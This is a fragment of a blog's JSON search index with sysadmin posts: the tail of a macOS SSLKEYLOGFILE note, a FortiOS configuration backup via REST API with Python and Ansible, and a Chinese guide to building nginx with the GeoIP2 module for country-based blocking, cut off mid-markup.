class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopen -a \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Google Chrome\u0026#39;\u003c/span\u003e https://www.baidu.com/\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意：从 termial 启动 chrome，为了确保 chrome 可以读取 SSLKEYLOGFILE 环境变量。\u003c/p\u003e","tags":["URL","MacOS"],"title":"MacBook 设置 SSLKEYLOGFILE 环境变量解密 HTTPS 流量"},{"categories":["URL","Ansible","FortiOS"],"contents":" Fortigate RestAPI Config Backup - FortiOS 6.0.4 Backup FortiOS config with Ansible - with RestAPI Create access profile FGTAWS0004BE1ADE # config system accprofile FGTAWS0004BE1ADE (accprofile) # edit readOnly new entry \u0026#39;readOnly\u0026#39; added FGTAWS0004BE1ADE (readOnly) # set sysgrp read FGTAWS0004BE1ADE (readOnly) # end Create API user in Fortigate FGTAWS0004BE1ADE # config system api-user FGTAWS0004BE1ADE (api-user) # edit api-admin new entry \u0026#39;api-admin\u0026#39; added FGTAWS0004BE1ADE (api-admin) # set accprofile \u0026#34;readOnly\u0026#34; FGTAWS0004BE1ADE (api-admin) # set vdom root FGTAWS0004BE1ADE (api-admin) # config trusthost FGTAWS0004BE1ADE (trusthost) # edit 1 new entry \u0026#39;1\u0026#39; added FGTAWS0004BE1ADE (1) # set ipv4-trusthost \u0026#39;ip_address_of_your_machine\u0026#39; 255.255.255.255 FGTAWS0004BE1ADE (1) # end FGTAWS0004BE1ADE (api-admin) # end Generate API token FGTAWS0004BE1ADE # execute api-user generate-key api-admin New API key: \u0026#39;your_api_token\u0026#39; NOTE: The bearer of this API key will be granted all access privileges assigned to the api-user api-admin. Test # fortigate.py import requests import urllib3 # disable security warning for SSL certificate urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # disable security warning for SSL certificate def config_download(ipaddr, api_token, filename=\u0026#39;backup.conf\u0026#39;): \u0026#39;\u0026#39;\u0026#39; input: ipaddr(string) - target ip address of fortigate input: api_token(string) - api_token for api user(accprofile should have sysgrp.mnt) input: filename(string) - file name of the config to be saved. default backup.conf output: True if backup successfule. False if not successful. Tested on: Fortigate OnDemand on AWS - FortiOS6.0.4 \u0026#39;\u0026#39;\u0026#39; base_url = f\u0026#39;https://{ipaddr}/api/v2/\u0026#39; headers = {\u0026#39;Authorization\u0026#39;: f\u0026#39;Bearer {api_token}\u0026#39;} params = {\u0026#39;scope\u0026#39;: \u0026#39;global\u0026#39;} uri = \u0026#39;monitor/system/config/backup/\u0026#39; rep = requests.get(base_url + uri, headers=headers, params=params, verify=False) if rep.status_code != 200: print(f\u0026#39;Something went wrong. status_code: {rep.status_code}\u0026#39;) return False with open(filename, \u0026#39;w\u0026#39;) as f: f.write(rep.text) return True \u0026gt;\u0026gt;\u0026gt; import fortigate \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; ip_addr = \u0026#39;Fortigate_IP_Address\u0026#39; \u0026gt;\u0026gt;\u0026gt; api_token = \u0026#39;API_TOKEN\u0026#39; \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; if (fortigate.config_download(ip_addr, api_token, \u0026#39;backup20190215.conf\u0026#39;)): ... print(\u0026#39;Done!\u0026#39;) ... else: ... print(\u0026#39;Error!!\u0026#39;) ... Done! \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; with open(\u0026#39;backup20190215.conf\u0026#39;, \u0026#39;r\u0026#39;) as f: ... f.readline() ... \u0026#39;#config-version=FGTAWS-6.0.4-FW-build0231-190107:opmode=0:vdom=0:user=api-admin\\n\u0026#39; \u0026gt;\u0026gt;\u0026gt; Configure Ansible inventory and playbook $ cat hosts [fortigate] x.x.x.x access_token=w4q9qtfbGry3Nbc40kHjsk9mxG**** y.y.y.y access_token=tfy8c9b8Nxw6N3Q5Q5bg9z69dn**** $ cat fortigate_backup.yml - name: fortigate config backup connection: local hosts: fortigate tasks: - name: get current config uri: url: \u0026#39;https://{{ ansible_host }}/api/v2/monitor/system/config/backup/?scope=global\u0026amp;access_token={{ access_token }}\u0026#39; return_content: yes validate_certs: no register: current_config - name: write config to local file local_action: copy content={{ current_config.content }} dest=./{{ inventory_hostname }}_{{ ansible_date_time.date }}.txt ","date":"November 3, 2020","hero":"/images/hero/ansible.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20201103-backup-fortios-config-with-ansible-with-restapi/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"http://shogokobayashi.com/2019/02/15/fortigate-restapi-config-backup-fortios-6-0-4/\" target=\"_blank\" rel=\"noopener\"\u003eFortigate RestAPI Config Backup - FortiOS 6.0.4\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"http://shogokobayashi.com/2019/04/05/backup-fortios-config-with-ansible-with-restapi/\" target=\"_blank\" rel=\"noopener\"\u003eBackup FortiOS config with Ansible - with RestAPI\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"create-access-profile\"\u003eCreate access profile\u003c/h5\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eFGTAWS0004BE1ADE # config system accprofile\nFGTAWS0004BE1ADE (accprofile) # edit readOnly\nnew entry \u0026#39;readOnly\u0026#39; added\nFGTAWS0004BE1ADE (readOnly) # set sysgrp read\nFGTAWS0004BE1ADE (readOnly) # end\n\u003c/code\u003e\u003c/pre\u003e\u003ch5 id=\"create-api-user-in-fortigate\"\u003eCreate API user in Fortigate\u003c/h5\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eFGTAWS0004BE1ADE # config system api-user\nFGTAWS0004BE1ADE (api-user) # edit api-admin\nnew entry \u0026#39;api-admin\u0026#39; added\nFGTAWS0004BE1ADE (api-admin) # set accprofile \u0026#34;readOnly\u0026#34;\nFGTAWS0004BE1ADE (api-admin) # set vdom root\nFGTAWS0004BE1ADE (api-admin) # config trusthost\nFGTAWS0004BE1ADE (trusthost) # edit 1\nnew entry \u0026#39;1\u0026#39; added\nFGTAWS0004BE1ADE (1) # set ipv4-trusthost \u0026#39;ip_address_of_your_machine\u0026#39; 255.255.255.255\nFGTAWS0004BE1ADE (1) # end\nFGTAWS0004BE1ADE (api-admin) # end\n\u003c/code\u003e\u003c/pre\u003e\u003ch5 id=\"generate-api-token\"\u003eGenerate API token\u003c/h5\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eFGTAWS0004BE1ADE # execute api-user generate-key api-admin\nNew API key: \u0026#39;your_api_token\u0026#39;\nNOTE: The bearer of this API key will be granted all access privileges assigned to the api-user api-admin.\n\u003c/code\u003e\u003c/pre\u003e\u003ch5 id=\"test\"\u003eTest\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# fortigate.py\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e requests\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e urllib3 \u003cspan style=\"color:#75715e\"\u003e# disable security warning for SSL certificate\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eurllib3\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edisable_warnings(urllib3\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eexceptions\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eInsecureRequestWarning) \u003cspan style=\"color:#75715e\"\u003e# disable security warning for SSL certificate\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003econfig_download\u003c/span\u003e(ipaddr, api_token, filename\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;backup.conf\u0026#39;\u003c/span\u003e):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e    input: ipaddr(string) - target ip address of fortigate\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e    input: api_token(string) - api_token for api user(accprofile should have sysgrp.mnt)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e    input: filename(string) - file name of the config to be saved. default backup.conf\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e    output: True if backup successfule. False if not successful.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e    Tested on: Fortigate OnDemand on AWS - FortiOS6.0.4\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e    \u0026#39;\u0026#39;\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    base_url \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;https://\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eipaddr\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e/api/v2/\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    headers \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e {\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Authorization\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Bearer \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eapi_token\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    params \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e {\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;scope\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;global\u0026#39;\u003c/span\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    uri \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;monitor/system/config/backup/\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    rep \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e requests\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eget(base_url \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e uri, headers\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eheaders, params\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eparams, verify\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eFalse\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e rep\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003estatus_code \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e200\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        print(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Something went wrong. status_code: \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003erep\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003estatus_code\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eFalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ewith\u003c/span\u003e open(filename, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;w\u0026#39;\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003eas\u003c/span\u003e f:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        f\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ewrite(rep\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003etext)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e\u0026gt;\u0026gt;\u0026gt; import fortigate\n\u0026gt;\u0026gt;\u0026gt;\n\u0026gt;\u0026gt;\u0026gt; ip_addr = \u0026#39;Fortigate_IP_Address\u0026#39;\n\u0026gt;\u0026gt;\u0026gt; api_token = \u0026#39;API_TOKEN\u0026#39;\n\u0026gt;\u0026gt;\u0026gt;\n\u0026gt;\u0026gt;\u0026gt; if (fortigate.config_download(ip_addr, api_token, \u0026#39;backup20190215.conf\u0026#39;)):\n...   print(\u0026#39;Done!\u0026#39;)\n... else:\n...   print(\u0026#39;Error!!\u0026#39;)\n...\nDone!\n\u0026gt;\u0026gt;\u0026gt;\n\u0026gt;\u0026gt;\u0026gt; with open(\u0026#39;backup20190215.conf\u0026#39;, \u0026#39;r\u0026#39;) as f:\n...   f.readline()\n...\n\u0026#39;#config-version=FGTAWS-6.0.4-FW-build0231-190107:opmode=0:vdom=0:user=api-admin\\n\u0026#39;\n\u0026gt;\u0026gt;\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003chr\u003e\n\u003ch5 id=\"configure-ansible-inventory-and-playbook\"\u003eConfigure Ansible inventory and playbook\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ cat hosts\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003efortigate\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ex.x.x.x access_token\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ew4q9qtfbGry3Nbc40kHjsk9mxG****\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ey.y.y.y access_token\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003etfy8c9b8Nxw6N3Q5Q5bg9z69dn****\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e$ cat fortigate_backup.yml\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003efortigate config backup\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003econnection\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003elocal\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003ehosts\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003efortigate\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003etasks\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eget current config\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003euri\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#f92672\"\u003eurl\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;https://{{ ansible_host }}/api/v2/monitor/system/config/backup/?scope=global\u0026amp;access_token={{ access_token }}\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#f92672\"\u003ereturn_content\u003c/span\u003e: \u003cspan style=\"color:#66d9ef\"\u003eyes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#f92672\"\u003evalidate_certs\u003c/span\u003e: \u003cspan style=\"color:#66d9ef\"\u003eno\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eregister\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003ecurrent_config\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003ewrite config to local file\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003elocal_action\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003ecopy content={{ current_config.content }} dest=./{{ inventory_hostname }}_{{ ansible_date_time.date }}.txt\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Ansible","FortiOS"],"title":"Backup FortiOS config with Ansible - with RestAPI"},{"categories":["URL","Nginx","GeoIP"],"contents":" 2020 年，最新 NGINX 的 ngx_http_geoip2 模块以精准禁止特定国家或者地区 IP 访问 centos7 下 安装 GeoIP2，在 nginx 中根据 ip 地址对应的国家转发请求 安装 geoip2 lib cd /usr/local/src rm -f libmaxminddb-1.4.2.tar.gz wget https://github.com/maxmind/libmaxminddb/releases/download/1.4.2/libmaxminddb-1.4.2.tar.gz tar -xzf libmaxminddb-1.4.2.tar.gz cd libmaxminddb-1.4.2 yum install gcc gcc-c++ make -y ./configure make make check sudo make install echo \u0026#39;/usr/local/lib\u0026#39; \u0026gt; /etc/ld.so.conf.d/geoip.conf sudo ldconfig 下载 ngx_http_geoip2_module 模块 cd /usr/local/src wget https://github.com/leev/ngx_http_geoip2_module/archive/3.3.tar.gz tar -xzf 3.3.tar.gz mv ngx_http_geoip2_module-3.3 ngx_http_geoip2_module # nginx集成 cd /usr/local/src wget http://nginx.org/download/nginx-1.16.1.tar.gz tar -zxf nginx-1.16.1.tar.gz cd nginx-1.16.1 useradd -M -s /sbin/nologin www yum install gcc gcc-c++ make pcre-devel zlib-devel openssl-devel -y ./configure --user=www --group=www --prefix=/usr/local/nginx \\ --with-ld-opt=\u0026#34;-Wl,-rpath -Wl,/usr/local/lib\u0026#34; \\ --with-http_sub_module \\ --with-http_realip_module \\ --with-http_gzip_static_module \\ --with-http_ssl_module \\ --with-http_v2_module \\ --add-module=/usr/local/src/ngx_http_geoip2_module make make install geoip2 IP 地址库下载 2020 年最新 GeoLite2-City.mmdb 无法直接下载，必须注册 maxmind 账号\n需要在 maxmind 后台注册账号，并且生成 Account/User ID 和 License key 安装 geoipupdate, 下载地址https://github.com/maxmind/geoipupdate/releases 配置 geoipupdate 的 GeoIP.conf , 填写 maxmind 账号的 User ID 和 License key 和 EditionIDs 博主使用的是 centos 7 安装如下\ncd /usr/local/src/ wget https://github.com/maxmind/geoipupdate/releases/download/v4.2.0/geoipupdate_4.2.0_linux_amd64.rpm rpm -ivh geoipupdate_4.2.0_linux_amd64.rpm rpm -ql geoipupdate vi /etc/GeoIP.conf #填写AccountID XXXX #填写LicenseKey XXXX #EditionIDs可以不修改，系统默认有填 GeoLite2-Country GeoLite2-City #笔者EditionIDs只保留GeoLite2-City #保存退出 #运行geoipupdate /usr/bin/geoipupdate cd /usr/share/GeoIP/ # 会看到GeoLite2-City.mmdb 把GeoLite2-City.mmdb文件cp到需要使用的目录 sudo mkdir -p /usr/local/nginx/geoip/ cp -rf /usr/share/GeoIP/GeoLite2-City.mmdb /usr/local/nginx/geoip/maxmind-city.mmdb 注意 GeoLite2 City 和 GeoLite2 Country 两个 IP 库，请下载 City 的 mmdb 数据文件，较于其他两者信息更丰富\nhttp { ... geoip2 /usr/local/nginx/geoip/maxmind-city.mmdb { $geoip2_data_country_code default=US source=$remote_addr country iso_code; $geoip2_data_country_name country names en; $geoip2_data_city_name default=London city names en; $geoip2_data_province_name subdivisions 0 names en; $geoip2_data_province_isocode subdivisions 0 iso_code; } .... fastcgi_param COUNTRY_CODE $geoip2_data_country_code; fastcgi_param COUNTRY_NAME $geoip2_data_country_name; fastcgi_param CITY_NAME $geoip2_data_city_name; .... map geoip2_data_country_code $allowed_country { default yes; US no; JP no; SG no; } } stream { ... geoip2 /usr/local/nginx/geoip/maxmind-city.mmdb { $geoip2_data_country_code default=US source=$remote_addr country iso_code; $geoip2_data_country_name country names en; $geoip2_data_city_name default=London city names en; $geoip2_data_province_name subdivisions 0 names en; $geoip2_data_province_isocode subdivisions 0 iso_code; } ... } server { if ($allowed_country = no) { return 403; } } /usr/local/bin/mmdblookup --file /usr/local/nginx/geoip/maxmind-city.mmdb --ip 8.8.8.8\n","date":"October 27, 2020","hero":"/images/hero/nginx.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20201027-nginx_geoip2/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.cnblogs.com/faberbeta/p/nginx_geoip2.html\" target=\"_blank\" rel=\"noopener\"\u003e2020 年，最新 NGINX 的 ngx_http_geoip2 模块以精准禁止特定国家或者地区 IP 访问\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.cnblogs.com/baxiqiuxing/p/12376879.html\" target=\"_blank\" rel=\"noopener\"\u003ecentos7 下 安装 GeoIP2，在 nginx 中根据 ip 地址对应的国家转发请求\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"安装-geoip2-lib\"\u003e安装 geoip2 lib\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecd /usr/local/src\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003erm -f libmaxminddb-1.4.2.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewget https://github.com/maxmind/libmaxminddb/releases/download/1.4.2/libmaxminddb-1.4.2.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etar -xzf libmaxminddb-1.4.2.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecd libmaxminddb-1.4.2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eyum install gcc gcc-c++ make -y\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./configure\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emake\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emake check\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo make install\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/usr/local/lib\u0026#39;\u003c/span\u003e \u0026gt; /etc/ld.so.conf.d/geoip.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo ldconfig\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"下载-ngx_http_geoip2_module-模块\"\u003e下载 ngx_http_geoip2_module 模块\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecd /usr/local/src\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewget https://github.com/leev/ngx_http_geoip2_module/archive/3.3.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etar -xzf 3.3.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emv ngx_http_geoip2_module-3.3 ngx_http_geoip2_module\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan 